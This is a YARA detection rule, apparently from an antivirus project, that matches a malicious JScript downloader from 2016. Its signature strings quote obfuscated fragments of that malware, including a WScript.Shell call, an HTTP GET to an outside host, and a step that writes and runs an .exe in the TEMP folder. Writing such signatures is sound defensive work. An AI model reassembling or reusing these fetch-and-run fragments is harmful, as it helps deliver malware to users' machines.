rule sig_20160330_b37f2e3e299bce72e676f927b0af129e {
  meta:
    description = "datamaliciousorder - file 20160330_b37f2e3e299bce72e676f927b0af129e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef2240314de9833aed12669a3ab83afc71234fcbe5c8382d8fa0fc7ae30423d0"

  strings:
    $s1  = "function _PC(_C, _F1){_U = _U * 1; return _C - _F1;};" fullword ascii
    $s2  = "var _IJ = function _OX() {return WScript[_GL](\"WScript\"+\".Shell\");}(), _KK = 11;" fullword ascii
    $s3  = "_BB[_ZS](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s4  = "if (_BB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _K() {return _IJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"aUA2GYHUGsM7fdCm.ex\" + \"e\";};" fullword ascii
    $s6  = "function _A(){return _NX + \"\";};" fullword ascii
    $s7  = "function _F() {return ((_J == true) && (_J == _F0)) ? 1 : _U;};" fullword ascii
    $s8  = "function _OA(_A0){_IJ[\"Run\"](_A0, _U, _U);};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _G(){return 22;};" fullword ascii
    $s11 = "function _N()" fullword ascii
    $s12 = "var _Q = new this[\"Date\"]();" fullword ascii
    $s13 = "return _PC(_CV, _BI);" fullword ascii
    $s14 = "function _WU(){return _GL;};" fullword ascii
    $s15 = "function _D(_O) {var _R = (1, 2, 3, 4, 5, _O); return _R;};" fullword ascii
    $s16 = "var _F0 = false;" fullword ascii
    $s17 = "var _J = false;" fullword ascii
    $s18 = "_J = true; " fullword ascii
    $s19 = "_F0 = true; " fullword ascii
    $s20 = "var _UZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}